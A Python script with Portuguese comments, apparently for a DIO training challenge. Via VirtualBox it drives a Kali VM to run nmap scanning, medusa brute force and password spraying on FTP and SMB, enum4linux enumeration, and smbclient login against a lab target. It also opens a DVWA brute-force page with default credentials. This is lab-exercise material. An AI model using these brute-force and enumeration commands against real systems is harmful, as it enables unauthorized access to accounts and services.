# -*- coding: utf-8 -*-
"""
Alternativa para VS Code: executa a suíte com efeito de digitação no terminal,
salva as evidências e abre o DVWA no navegador padrão.

Uso no terminal integrado do VS Code:
    python executar_vscode.py

Não precisa de Cypress. Requer apenas o VirtualBox com a VM Kali ligada.
"""
import subprocess
import sys
import time
import webbrowser
from pathlib import Path

VBOX = r"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"
VM = "kali-linux-2026.3-virtualbox-amd64"
USER, PASS = "kali", "kali"

PASTA = Path(__file__).resolve().parent
IMGS = PASTA.parent / "images"
IMGS.mkdir(parents=True, exist_ok=True)

COMANDOS = [
    ("01-identidade-ip", "whoami && ip -4 a | grep inet"),
    ("02-ping-alvo", "ping -c 2 192.168.56.101"),
    ("03-nmap", "nmap -n -sV -Pn 192.168.56.101"),
    ("04-medusa-ftp", "medusa -h 192.168.56.101 -U /home/kali/desafio/wordlists/users.txt "
                      "-P /home/kali/desafio/wordlists/passwords.txt -M ftp -t 4"),
    ("05-enum4linux", "enum4linux -U 192.168.56.101"),
    ("06-medusa-smb", "medusa -h 192.168.56.101 -U /home/kali/desafio/wordlists/users-enum.txt "
                      "-P /home/kali/desafio/wordlists/spray.txt -M smbnt -t 3"),
    ("07-smb-acesso", "smbclient //192.168.56.101/msfadmin -U msfadmin%msfadmin -c 'ls'"),
]

AMARELO = "\033[93m"
VERDE = "\033[92m"
AZUL = "\033[94m"
RESET = "\033[0m"


def digitar(texto, atraso=0.012):
    for caractere in texto:
        sys.stdout.write(caractere)
        sys.stdout.flush()
        time.sleep(atraso)
    print()


def executar_no_kali(comando):
    args = [VBOX, "guestcontrol", VM, "run", "--exe", "/bin/bash",
            "--username", USER, "--password", PASS,
            "--wait-stdout", "--", "-lc", comando]
    resultado = subprocess.run(args, capture_output=True, text=True,
                               encoding="utf-8", errors="replace", timeout=240)
    return (resultado.stdout or "") + (resultado.stderr or "")


def main():
    print(f"{AZUL}=== Desafio DIO - Suite automatizada (VS Code) ==={RESET}")
    print("Kali: 192.168.56.102  |  Alvo: 192.168.56.101  |  Rede Host-Only\n")

    for nome, comando in COMANDOS:
        print(f"{AMARELO}[{nome}]{RESET} ", end="")
        digitar(f"kali@kali:~$ {comando}", atraso=0.006)
        saida = executar_no_kali(comando).strip()
        print(saida)
        (IMGS / f"vscode-{nome}.txt").write_text(
            f"$ {comando}\n\n{saida}\n", encoding="utf-8")
        print("-" * 70)

    print(f"{VERDE}Evidências salvas em: {IMGS}{RESET}")
    print(f"{VERDE}Abrindo o DVWA no navegador...{RESET}")
    webbrowser.open("http://192.168.56.101/dvwa/login.php")
    time.sleep(2)
    webbrowser.open("http://192.168.56.101/dvwa/vulnerabilities/brute/"
                    "?username=admin&password=password&Login=Login")

    # Opcional: captura da tela se pyautogui estiver instalado
    try:
        import pyautogui  # noqa
        time.sleep(2)
        pyautogui.screenshot().save(str(IMGS / "vscode-tela-final.png"))
        print(f"{VERDE}Print salvo: vscode-tela-final.png{RESET}")
    except ImportError:
        print("Dica: instale pyautogui para salvar um print da tela (pip install pyautogui)")


if __name__ == "__main__":
    main()
